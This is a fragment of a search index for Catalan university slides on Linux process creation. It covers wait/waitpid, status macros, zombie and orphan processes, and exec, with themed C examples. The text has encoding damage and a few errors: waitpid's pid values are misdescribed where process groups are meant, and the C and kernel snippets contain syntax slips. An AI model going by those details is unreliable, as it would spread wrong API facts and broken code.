    "text": "wait()\n\n\n\n\n\n\n\n\n\nwait()\n\n\nLa crida al sistema wait() permet que un proc√©s pare bloquegi la seva execuci√≥ fins que un dels seus processos fills canvi√Ø d‚Äôestat (normalment, quan finalitza). Tamb√© recupera informaci√≥ sobre el fill que ha canviat d‚Äôestat.\n#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\npid_t wait(int *_Nullable wstatus);\n\n\n\n\n\n\n\n\n\n\n\nPropietats\n\n\n\nRetorna el PID del proc√©s fill que ha canviat d‚Äôestat, o -1 en cas d‚Äôerror.\nSi wstatus no √©s NULL, l‚Äôestat de sortida del fill s‚Äôhi emmagatzema.\n\n\n\n\n\n\n\n\n\n\n\n\nSIGCHLD\n\n\nEl senyal SIGCHLD s‚Äôenvia al proc√©s pare quan un fill canvia d‚Äôestat.\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare\n    participant K as Kernel\n    participant C as Fill\n    P-&gt;&gt;K: fork()\n    K--&gt;&gt;C: Crea Proc√©s Fill\n    activate C\n    K--&gt;&gt;P: Retorna PID del Fill\n    C-&gt;&gt;C: Execuci√≥ del Fill\n    P-&gt;&gt;K: wait()\n    K-&gt;&gt;K: Bloqueja pare fins que el fill canvi√Ø d'estat\n    C-&gt;&gt;K: exit(42)\n    deactivate C\n    K-&gt;&gt;K: PCB retingut \n    K--&gt;&gt;P: notificaci√≥ SIGCHLD\n    P-&gt;&gt;K: Llegeix estat del Fill Reads\n    K-&gt;&gt;K: Allibera PCB fill\n    K--&gt;&gt;P: Retorna estat (42)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#example-wait",
    "href": "slides/03-create.html#example-wait",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Example: wait()",
    "text": "Example: wait()\n\n\nint main() {\n    pid_t pid;\n    if ((pid = fork()) &lt; 0) {\n        exit(-1);\n    } else if (pid == 0) {  \n        printf(\"My name is Rhaenyra\")\n    } else {\n        wait(NULL);\n        printf(\"My name is King Viserys\");\n        }\n    exit(0);\n}\n\n\n\n\n\n\n\nObservacions\n\n\n\nEl proc√©s pare utilitza wait() per esperar que el seu fill finalitzi abans de continuar. Aix√≤ assegura que la sortida ser√† sempre My name is King Viserys despr√©s de My name is Rhaenyra.\nNo garanteix que el fill s‚Äôexecuti primer. Nom√©s assegura que el fill acabi abans que el pare reprengui la seva execuci√≥.\nwait() √©s per a un pare que espera un fill. Un fill no pot utilitzar-lo per esperar el seu pare.\nAltres mecanismes, com pause() i senyals, s√≥n necessaris per a diferents escenaris de sincronitzaci√≥.\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Pare (PID X)\n    participant K as Kernel\n    participant C as Fill (PID Y)\n    \n    P-&gt;&gt;K: fork()\n    K--&gt;&gt;C: Crea Proc√©s\n    K--&gt;&gt;P: Retorna PID Y\n    K--&gt;&gt;C: Returns 0\n    \n    P-&gt;&gt;K: wait()\n    Note right of P: Estat: WAITING\n    K-&gt;&gt;K: Planificador: continua Fill\n    \n    activate C\n    C-&gt;&gt;C: printf(\"My name is Rhaenyra\")\n    C-&gt;&gt;K: exit(0)\n    deactivate C\n    \n    K--&gt;&gt;P: SIGCHLD + status (0)\n    Note right of P: Estat: RUNNING\n    P-&gt;&gt;P: printf(\"My name is King Viserys\")\n    P-&gt;&gt;K: exit(0)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitpid",
    "href": "slides/03-create.html#waitpid",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "waitpid()",
    "text": "waitpid()\n\n\n\n\n\n\n\n\n\nwaitpid()\n\n\nPermet que un proc√©s pare esperi de manera selectiva que un proc√©s fill espec√≠fic canvi√Ø d‚Äôestat. Tamb√© proporciona m√©s control sobre el comportament de l‚Äôespera mitjan√ßant opcions addicionals.\npid_t waitpid(pid_t pid, int *_Nullable wstatus, int options);\n\n\n\n\n\n\n\n\n\n\n\nOptions\n\n\n\nWNOHANG: No bloquejar si cap proc√©s fill ha canviat d‚Äôestat. Aix√≤ significa que la crida retorna immediatament.\nWUNTRACED: Tamb√© retorna per processos fills que han estat aturats (per exemple, per un senyal).\nWCONTINUED: Tamb√© retorna per processos fills que han estat repr√®s despr√©s d‚Äôhaver estat aturat (disponible des de Linux 2.6.10).\n\n\n\n\n\n\n\n\n\n\n\n\n\nValors de pid\n\n\n\n\\(\\lt -1\\): Espera qualsevol proc√©s fill el PID del qual sigui igual al valor absolut de pid.\n\\(= -1\\): Espera qualsevol proc√©s fill.\n\\(= 0\\): Espera qualsevol proc√©s fill el PID del qual sigui igual al del proc√©s que crida (el pare).\n\\(\\gt 0\\): Espera el proc√©s fill espec√≠fic identificat per aquest valor de pid.\n\n\n\n\n\n\n\n\n\n\n\n\nObservaci√≥\n\n\nwait(NULL) √©s equivalent a waitpid(-1, NULL, 0)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#example-waitpid",
    "href": "slides/03-create.html#example-waitpid",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Example: waitpid()",
    "text": "Example: waitpid()\n\n\n\nint main() {\n    printf(\"Dracarys!\\n\");\n    pid_t drogon = fork();\n    if (drogon == 0) { \n        sleep(1);  \n        printf(\"Fire and blood in KL!\\n\");\n        exit(0); \n    }\n    pid_t rhaegal = fork();\n    if (rhaegal == 0) {\n        sleep(3); \n        printf(\"Flying over Saltspear\\n\");\n        exit(0);\n    }\n    waitpid(rhaegal, NULL, 0);\n    printf(\"Rhaegal has returned\\n\");\n    waitpid(drogon, NULL, 0);\n    printf(\"Drogon has returned\\n\");\n    exit(0);\n}\n\n\n\n\n\n\nsequenceDiagram\n    participant D as Daenerys\n    participant K as Kernel\n    participant D1 as Drogon\n    participant D2 as Rhaegal\n  \n    Note over D: dracarys!\n    D-&gt;&gt;K: fork() (Drogon)\n    activate D1\n    D-&gt;&gt;K: fork() (Rhaegal)\n    activate D2\n\n    Note over D1: sleep(1)\n    D1-&gt;&gt;D1: printf(\"Fire and blood in KL!\")\n    D1-&gt;&gt;K: exit(0)\n    deactivate D1\n\n    Note over D2: sleep(3)\n    D2-&gt;&gt;D2: printf(\"Flying over Saltspear\")\n    D2-&gt;&gt;K: exit(0)\n    deactivate D2\n\n    D-&gt;&gt;K: waitpid(Rhaegal)\n    K--&gt;&gt;D: Returns Rhaegal's PID (Rhaegal finished)\n    D-&gt;&gt;D: printf(\"Rhaegal has returned\")\n    \n    D-&gt;&gt;K: waitpid(Drogon)\n    K--&gt;&gt;D: Returns Drogon's PID (Drogon finished)\n    D-&gt;&gt;D: printf(\"Drogon has returned\")\n\n    D-&gt;&gt;K: exit(0)",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitwaitpid-macros",
    "href": "slides/03-create.html#waitwaitpid-macros",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "wait()/waitpid(): Macros",
    "text": "wait()/waitpid(): Macros\nEl par√†metre status de wait() o waitpid() √©s un enter (int) que cont√© informaci√≥ codificada sobre com ha finalitzat (o ha canviat d‚Äôestat) el proc√©s fill.\n\n\n\n\n\n\n\nx86\n\n\n\n\n\n\n\n\n\n\nBits\nCamp\nDescripci√≥\n\n\n\n\n0-6\nCodi de Senyal\nEl n√∫mero del senyal que ha causat la terminaci√≥ del fill, si n‚Äôhi ha. (WTERMSIG(status)).\n\n\n7\nIndicador de Core Dump\nIndicador si s‚Äôha generat un core dump. (WCOREDUMP(status)).\n\n\n8-15\nExit\nEl valor de retorn de l‚Äôexit() del fill. (WEXITSTATUS(status))\n\n\n16-31\n-\nGeneralment no utilitzat o reservat.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nQu√® passa amb exit(256)?\n\n\nEl n√∫mero 256 es converteix en un codi de sortida de 0 perqu√® els codis de sortida solen estar limitats a 8 bits (0-255). Aix√≤ es deu al fet que el sistema operatiu nom√©s utilitza els 8 bits menys significatius per al codi de sortida. Per tant, WEXITSTATUS(status) retornar√† 0.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitwaitpid-status-macros-i",
    "href": "slides/03-create.html#waitwaitpid-status-macros-i",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "wait()/waitpid(): Status Macros (I)",
    "text": "wait()/waitpid(): Status Macros (I)\n\nWIFEXITED(status): Retorna cert (no zero) si el proc√©s fill ha finalitzat normalment mitjan√ßant exit().\nWEXITSTATUS(status): Retorna el codi de sortida del fill. Nom√©s v√†lid si WIFEXITED(status) √©s cert.\nWIFSIGNALED(status): Retorna cert si el canvi d‚Äôestat del fill ha estat causat per un senyal.\nWTERMSIG(status): Retorna el n√∫mero del senyal que ha causat la terminaci√≥ del proc√©s fill. Nom√©s v√†lid si WIFSIGNALED(status) √©s cert.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#waitwaitpid-status-macros-ii",
    "href": "slides/03-create.html#waitwaitpid-status-macros-ii",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "wait()/waitpid(): Status Macros (II)",
    "text": "wait()/waitpid(): Status Macros (II)\n\nWCOREDUMP(status): Retorna cert si el fill ha terminat i ha generat un core dump. Nom√©s v√†lid si WIFSIGNALED(status) √©s cert. (La disponibilitat pot variar).\nWIFSTOPPED(status): Retorna cert si el fill ha estat susp√®s (aturat) per un senyal. Per detectar aix√≤, waitpid() ha de ser cridat amb l‚Äôopci√≥ WUNTRACED.\nWSTOPSIG(status): Retorna el n√∫mero del senyal que ha aturat el fill. Nom√©s v√†lid si WIFSTOPPED(status) √©s cert.\nWIFCONTINUED(status): Retorna cert si un fill que havia estat aturat ha estat reactivat (amb SIGCONT). Requereix l‚Äôopci√≥ WCONTINUED en waitpid() (Linux kernel 2.6 i posteriors).",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#exemple-waitpid-macros",
    "href": "slides/03-create.html#exemple-waitpid-macros",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Exemple: waitpid() & Macros",
    "text": "Exemple: waitpid() & Macros\n\n\nint main(int argc, char *argv[]){\npid_t pid, w; int status;\npid = fork();\nif (pid == 0) { \n  if (argc == 1) pause(); exit(atoi(argv[1]));\n} else {                    \n  do {\n    w = waitpid(pid, &status, WUNTRACED | WCONTINUED);\n    if (w == -1) {\n      perror(\"waitpid\"); exit(EXIT_FAILURE);\n    }\n    if (WIFEXITED(status)) {\n      printf(\"exited, [%d] status=%d\\n\", \n             pid, WEXITSTATUS(status));\n    } else if (WIFSIGNALED(status)) {\n      printf(\"killed by signal, \n        [%d] -&gt; %d\\n\", pid, WTERMSIG(status));\n    } else if (WIFSTOPPED(status)) {\n      printf(\"stopped by signal [%d] \n        -&gt; %d\\n\", pid, WSTOPSIG(status));\n    } else if (WIFCONTINUED(status)) { \n      printf(\"continued\\n\"); }\n  } while (!WIFEXITED(status) && !WIFSIGNALED(status));\n  exit(0);\n}\n\n\n\n\n\n\n\n\n\nPregunta?\n\n\nQuin ser√† el resultat despr√©s d‚Äôexecutar ./ex8 42?",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#estat-zombie",
    "href": "slides/03-create.html#estat-zombie",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Estat Zombie",
    "text": "Estat Zombie\n\n\n\n\n\n\n\nTASK_ZOMBIE\n\n\nDespr√©s d‚Äôexecutar exit(), un proc√©s no s‚Äôelimina immediatament. En lloc d‚Äôaix√≤, entra en l‚Äôestat zombie fins que el seu proc√©s pare processa la notificaci√≥ SIGCHLD o crida a wait() o waitpid(). Si el pare no ho fa, el fill roman en aquest estat indefinidament.\n\n\n\n\n\n\n// kernel/exit.c\nvoid do_exit(long code) {\n    struct task_struct *tsk = current;\n    tsk-&gt;exit_code = code;          \n    exit_files(tsk);               \n    exit_mm(tsk);                 \n    exit_notify(tsk, group_dead);   \n}\n\n// kernel/exit.c\nstatic void exit_notify(struct task_struct *tsk, \n    int group_dead) {\n    tsk-&gt;exit_state = EXIT_ZOMBIE;  \n    if (group_dead)\n        tsk-&gt;exit_state |= EXIT_DEAD;\n    tsk-&gt;exit_signal : SIGCHLD;\n    do_notify_parent(tsk, sig);\n}",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#orfes-i",
    "href": "slides/03-create.html#orfes-i",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Orfes (I)",
    "text": "Orfes (I)\nUn proc√©s fill esdev√© un orfe si el seu pare mor abans que ell. En aquest cas, el nucli reassigna el fill al proc√©s init (PID 1), que √©s responsable de netejar els processos orfes.\n\n\n\n\n\nsequenceDiagram\n    participant Pare\n    participant Kernel\n    participant Fill\n    participant Init\n    \n    Parent-&gt;&gt;Kernel: exit() // Mor el pare\n    Kernel-&gt;&gt;Kernel: find_zombie_children()\n    Note right of Child: Orfe, fill sense pare\n    Kernel-&gt;&gt;Child: reparent_to_init()\n    loop Cada 0.5s\n        Init-&gt;&gt;Kernel: wait()\n        Kernel-&gt;&gt;Init: Retorna estat\n        Kernel-&gt;&gt;Child: release_task()\n    end",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#orfes-i-zombies",
    "href": "slides/03-create.html#orfes-i-zombies",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Orfes i Zombies",
    "text": "Orfes i Zombies\n\n\n\n\n\n\n\n\n\nEscenari\nMecanisme del Nucli\nTemps\nConsequ√®ncies\n\n\n\n\nPare Actiu\nRet√© task_struct fins a wait()\nIndefinit\n- Consumeix entrada a la taula de processos- PID es mant√© ocupat\n\n\nPare Mort\nreparent_to_init() (PPID‚Üê1)\n\\(\\le 1\\) ms\n- Init neteja en segon pla (init periodicament crida wait()) - Alliberaci√≥ as√≠ncrona\n\n\nReinici del Sistema\nkill(pid, SIGKILL)\n0\n- Alliberaci√≥ for√ßada (via do_exit() global) - Sense garantia d‚Äôestat\n\n\nPare ignora SIGCHLD\nZombie persistent\n\\(\\infty\\)\n- Requereix intervenci√≥ manual",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#example-factoria-de-zombies",
    "href": "slides/03-create.html#example-factoria-de-zombies",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Example: Factoria de Zombies",
    "text": "Example: Factoria de Zombies\n\n\nzombie.c\nint main() {\npid_t pid; int i;\nfor (i = 0; ; i++) {\n    pid = fork();\n    if (pid &gt; 0) {\n        printf(\"Zombie #%d born:\\n\",i + 1); \n        sleep(1);\n    } else {\n        printf(\"*drool* Boooo! Arrgghh! *slobber*\\n\");\n        exit(0);\n    }\n}\nreturn 0;\n}\n\nTerminal 1\n$ gcc zombie.c -o zombie\n$ ./zombie\nZombie #1 born:\nZombie #2 born:\nZombie #3 born:\n...\n\nTerminal 2\n$ watch -n 1 \"ps u -C zombie\"\n\n\n\nInspired by https://www.refining-linux.org/archives/7-Dr.-Frankenlinux-or-how-to-create-zombie-processes.html",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#transformaci√≥-exec",
    "href": "slides/03-create.html#transformaci√≥-exec",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Transformaci√≥: exec()",
    "text": "Transformaci√≥: exec()\n\n\n\n\n\n\n\n\n\nProcessos Independents?\n\n\nTots els processos (excepte PID 1) tenen un pare i es creen amb clone(). Per√≤ com poden bash i ls ser programes separats?\n\n\n\n\n\n\n\n\n\n\n\nSyscall exec()\n\n\nPermet transformar un proc√©s fill en un nou programa. La fam√≠lia de funcions exec substitueix l‚Äôespai d‚Äôadreces del proc√©s actual amb un nou programa carregat des d‚Äôun fitxer executable (normalment en format ELF).\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nComponent\nAbans de exec()\nDespr√©s de exec()\n\n\n\n\nEspai d‚ÄôAdreces\nMapeig original\nNou mapeig ELF\n\n\nTaula de Fitxers\nHeretat\nHeretat (excepte FD_CLOEXEC)\n\n\nRegistres CPU\nContext original\nEIP=punt d‚Äôentrada, ESP=pila\n\n\nSenyals\nHandlers personalitzats\nTots restablerts a SIG_DFL\n\n\nMem√≤ria Compartida\nMAP_SHARED preservada\nMAP_PRIVATE eliminada\n\n\n\n\n\n\n\n\n\n\n\n\nsequenceDiagram\n    participant P as Original\n    participant K as Kernel\n    participant N as Nou\n\n    P-&gt;&gt;K: execve(\"/bin/ls\", [\"ls\",\"-l\"], envp)\n    activate K\n\n    K-&gt;&gt;K: Valida ELF (e_ident, permissions)\n    K-&gt;&gt;K: flush_old_exec()\n    K-&gt;&gt;K: free_pgtables()\n    K-&gt;&gt;K: load_elf_binary()\n\n    Note over P,N: El PID no canvia: √©s el mateix proc√©s a nivell de nucli\n\n    Note over K,N: Crear Nou Context\n    K-&gt;&gt;N: Map .text (RX)\n    K-&gt;&gt;N: Map .data/.bss (RW)\n    K-&gt;&gt;N: setup_arg_pages(argv, envp) ‚ü∂ stack\n    K-&gt;&gt;N: setup_brk() ‚ü∂ heap\n    K-&gt;&gt;N: start_thread(entry_point) &lt;br&gt; PC/IP ‚Üê entry point of the ELF binary\n\n    deactivate K\n\n    Note over N: Nova execuci√≥ de codi\n    N--&gt;&gt;K: Syscalls Futures\n    K--&gt;&gt;N: Returna\n\n    Note right of P: Els espai d'adreces original &lt;br&gt; s'ha destru√Øt &lt;br&gt; `task_struct` √©s el mateix &lt;br&gt; per√≤ amb el nou codi carregat",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#familia-exec",
    "href": "slides/03-create.html#familia-exec",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Familia exec()",
    "text": "Familia exec()\n\n\n\n\n\n\n\n\n\n\nValors de retorn\n\n\n\nMai retorna en cas d‚Äô√®xit (substitueix completament el proc√©s).\nRetorna -1 nom√©s en cas d‚Äôerror (s‚Äôestableix errno).\n\n\n\n\n\n\n#include &lt;unistd.h&gt;\n// Variants with argument list (variable arguments)\nint execl(const char *path, const char *arg0, ..., NULL);                \nint execlp(const char *file, const char *arg0, ..., NULL);                  \nint execle(const char *path, const char *arg0, ..., NULL, \n    char *const envp[]);\n\n#include &lt;unistd.h&gt;\n// Variants with argument vector (array)\nint execv(const char *path, char *const argv[]);                         \nint execvp(const char *file, char *const argv[]);                       \nint execve(const char *path, char *const argv[],\n    char *const envp[]);             \n\n\n\n\nexecve() √©s la crida al sistema b√†sica (les altres s√≥n embolcalls de glibc).\nGestiona correctament SUID/SGID.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#exemple-ls--la",
    "href": "slides/03-create.html#exemple-ls--la",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Exemple: ls -la",
    "text": "Exemple: ls -la\n\n\nint main() {\n    pid_t pid = fork();\n    if (pid == -1) { \n        perror(\"fork\");\n        exit(-1);\n    }\n    if (pid == 0) { \n        char *args[] = {\"ls\", \"-la\", NULL};\n        execv(\"/bin/ls\", args);\n        perror(\"execv fallat\"); \n        exit(-1);\n    } \n    else { \n        int status;\n        pid_t w = waitpid(pid, \n            &status, WUNTRACED);\n    }\n    exit(0);\n}\n\ngcc ex7.c -o ex7\n./ex7\ntotal 24\ndrwxr-xr-x  2 user user 4096 Feb 20 10:00 .\ndrwxr-xr-x 10 user user 4096 Feb 20 09:58 .. \n-rwxr-xr-x 1 user user 70512 Feb 20 14:57 ex7\n-rw-r--r-- 1 user user   107 Feb 20 13:23 ex7.c\n\n\n\n\n\n\nsequenceDiagram\n    box rgb(240,240,240) Parent Process\n    participant P\n    end\n    \n    box rgb(240,240,240) Kernel\n    participant K\n    end\n    \n    box rgb(240,240,240) Child Process\n    participant F\n    end\n\n    P-&gt;&gt;K: Calls `fork()`\n    activate K\n    K--&gt;&gt;F: Crea una nova c√≤pia del proc√©s (Fill, PID Y)&lt;br&gt; amb mem√≤ria id√®ntica (CoW)\n    K--&gt;&gt;P: Retorna PID Y al Pare\n    deactivate K\n    \n    par Execuci√≥ Concurrent\n        F-&gt;&gt;K: Crida `execv(\"/bin/ls\", [\"ls\",\"-la\"], NULL)`\n        \n        activate K\n        K-&gt;&gt;K: Valida `/bin/ls` (permissos, format)\n        K-&gt;&gt;K: Esborra tota la mem√≤ria del Fill (F)**\n        K-&gt;&gt;K: Carrega `ls` a la mem√≤ria del Fill**&lt;br&gt;  (codi, dades, nova pila)\n        K-&gt;&gt;K: Reconfigura els registres de la CPU i el PC/IP&lt;br&gt;  al punt d'entrada de `ls`\n        deactivate K\n\n        Note over K,F: Codi original Fill (PID Y) &lt;br&gt; ha estat reempla√ßat per `/bin/ls`.\n\n        activate F\n        F-&gt;&gt;F: Executa el programa `/bin/ls -la`&lt;br&gt;Genera la llista a `stdout`.\n        F-&gt;&gt;K: `exit(0)` (Finalitza `/bin/ls`)\n        deactivate F\n        \n        activate P\n        P-&gt;&gt;K: `waitpid(PID Y, &status, WUNTRACED)`\n        deactivate P\n    end\n\n    K--&gt;&gt;P: Notifica al Pare que el fill (ara `ls`) ha acabat.\n    activate P\n    P-&gt;&gt;K: `exit(0)` (Finalitza el Pare)\n    deactivate P",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#exercicis-proposats",
    "href": "slides/03-create.html#exercicis-proposats",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Exercicis proposats",
    "text": "Exercicis proposats\n\nExercici de Creaci√≥ de Processos",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/03-create.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/03-create.html#aix√≤-√©s-tot-per-avui",
    "title": "Creaci√≥ de Processos a Linux",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nTAKE HOME MESSAGE\nLa creaci√≥ i gesti√≥ de processos √©s fonamental en els sistemes operatius. Hem explorat com fork() crea nous processos, com exec() permet la transformaci√≥ de processos, i com wait() i waitpid() gestionen la sincronitzaci√≥ entre pares i fills. A m√©s, hem vist com es gestionen els processos zombies i orfes, i la import√†ncia de les macros per interpretar els estats dels processos fills.",
    "crumbs": [
      "Diapositives",
      "Unitat 03 ¬∑ Creaci√≥ de processos"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qui-soc",
    "href": "slides/01-introduction.html#qui-soc",
    "title": "Introducci√≥",
    "section": "Qui soc?",
    "text": "Qui soc?\n\n\nCurr√≠culum\n\nEnginyer i Doctor en Inform√†tica per la UdL.\n\nDoc√®ncia\n\nProfessor agregat a la UdL des de 2019.\nSistemes Operatius (GTIDIC, GEI).\nAdministraci√≥ de Sistemes (GTIDIC, GEI).\nDesenvolupament d‚ÄôAplicacions per a dispositus m√≤vils (GTIDIC).\nCloud Compunting (Master in Health Data Science)\nHigh Performance Computing (M√†ster en Enginyeria Inform√†tica)\n\n\nRecerca\n\nMembre del grup de recerca Grup de computaci√≥ distribu√Øda des de 2012 (Universitat de Lleida).\nMembre del grup de recerca Essence: Data Engineering & Distributed Computing Systems des de 2022 (Universitat de Glasgow).\nComputaci√≥ distribu√Øda: Cloud, Edge i Fog Computing.\nCamps d‚Äôaplicaci√≥: Salut electr√≤nica i Energia.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#qui-sou",
    "href": "slides/01-introduction.html#qui-sou",
    "title": "Introducci√≥",
    "section": "Qui sou?",
    "text": "Qui sou?\nQu√® us ha portat fins aqu√≠?\n\n\n\n\nPer con√®ixer-vos una mica millor, m‚Äôagradaria que respongu√©ssiu 4 preguntes de forma breu i concisa, que m‚Äôajudaran a entendre les vostres motivacions i expectatives respecte a aquesta assignatura. Us deixo 5 minuts per respondre-les.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#presentaci√≥",
    "href": "slides/01-introduction.html#presentaci√≥",
    "title": "Introducci√≥",
    "section": "Presentaci√≥",
    "text": "Presentaci√≥\n\nBenvinguts a Sistemes Operatius\n\n\n\nchar text[] = \"Aquesta NO √©s una assignatura\\n\\\n      centrada en la  programaci√≥\\n\\\n      PER√í programarem MOLT!\\n\";\nssize_t bytes = write(1, text, sizeof(text) - 1);\n\ntext=\"Aquesta assignatura NO √©s un MON√íLEG.\" \necho $text\n\n\nVull sessions interactives, participatives,‚Ä¶ pregunteu, interrompeu-me‚Ä¶\n\n\n\n\n\nSi b√© aquesta assignatura no se centra exclusivament en l‚Äôaprenentatge de la programaci√≥, la pr√†ctica de codificaci√≥ ser√† fonamental. Un sistema operatiu √©s, en ess√®ncia, un programa extremadament complex, i per entendre‚Äôn el funcionament, cal aprofundir en el seu codi font.\nPer aix√≤, la nostra eina principal ser√† el llenguatge de programaci√≥ C, ja que √©s el llenguatge amb qu√® s‚Äôhan constru√Øt sistemes operatius hist√≤rics i de refer√®ncia com Linux i Unix. A m√©s, per comprendre com el codi d‚Äôalt nivell es comunica amb el maquinari, √©s crucial entendre com es tradueix a codi m√†quina; aqu√≠ √©s on la comprensi√≥ del llenguatge Assembler es torna imprescindible.\nTot i que llenguatges m√©s moderns com Rust o Go s‚Äôutilitzen cada vegada m√©s en el desenvolupament de sistemes, el C continua sent el pilar sobre el qual es construeix la major part del nostre m√≥n digital.\nFinalment, vull que aquestes sessions siguin realment interactives i participatives. Si us plau, no dubteu a interrompre‚Äôm i a plantejar qualsevol pregunta o dubte que tingueu en el moment. La meva intenci√≥ no √©s fer un mon√≤leg, sin√≥ crear un di√†leg constructiu i col¬∑laboratiu entre tots.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#coneixement-previ-i",
    "href": "slides/01-introduction.html#coneixement-previ-i",
    "title": "Introducci√≥",
    "section": "Coneixement previ (I)",
    "text": "Coneixement previ (I)\nQuin sistema operatiu utilitzeu/coneixeu?\n\n\n\n\nPer comen√ßar, m‚Äôagradaria saber quin sistema operatiu utilitzeu o coneixeu. Aix√≤ ens ajudar√† a entendre el nivell de familiaritat que teniu amb diferents sistemes i ens permetr√† adaptar millor el contingut del curs a les vostres necessitats. Escaneja el codi QR i introdueix les vostres respostes, podeu respondre m√©s d‚Äôuna opci√≥ si coneixeu diversos sistemes operatius.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#objectius-globals",
    "href": "slides/01-introduction.html#objectius-globals",
    "title": "Introducci√≥",
    "section": "Objectius (Globals)",
    "text": "Objectius (Globals)\n\nEntendre els Sistemes Operatius: Com estan dissenyats i quins components (o m√≤duls) els formen.\nConeixer els seus serveis: Quines funcions proporcionen a usuaris i aplicacions.\nAprendre a programar amb ells: Com utilitzar els serveis del sistema operatiu per crear aplicacions de manera eficient.\nAvaluar cr√≠ticament les seves pol√≠tiques: Analitzar com el sistema operatiu gestiona els seus recursos, com la mem√≤ria, i comparar diferents m√®todes per fer-ho.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#objectius-espec√≠fics",
    "href": "slides/01-introduction.html#objectius-espec√≠fics",
    "title": "Introducci√≥",
    "section": "Objectius (Espec√≠fics)",
    "text": "Objectius (Espec√≠fics)\n\nCon√®ixer els sistemes operatius Unix/Linux (en concret Debian).\nInterioritza les bases de programaci√≥ C per millora les vostres habilitats en altres llenguatges.\nDesenvolupar programari a nivell de sistema en el llenguatge de programaci√≥ C comprenent al mateix temps com funcionen els Sistemes Operatius basats en Unix.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#temari",
    "href": "slides/01-introduction.html#temari",
    "title": "Introducci√≥",
    "section": "Temari",
    "text": "Temari\n\nIntroducci√≥ als Sistemes Operatius.\nEstructura dels Sistemes Operatius.\nGesti√≥ i comunicaci√≥ de processos i threads.\nSincronitzaci√≥ i Planificador de tasques.\nInterbloqueig.\nGesti√≥ de Mem√≤ria.\nScripting.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#metodologia",
    "href": "slides/01-introduction.html#metodologia",
    "title": "Introducci√≥",
    "section": "Metodologia",
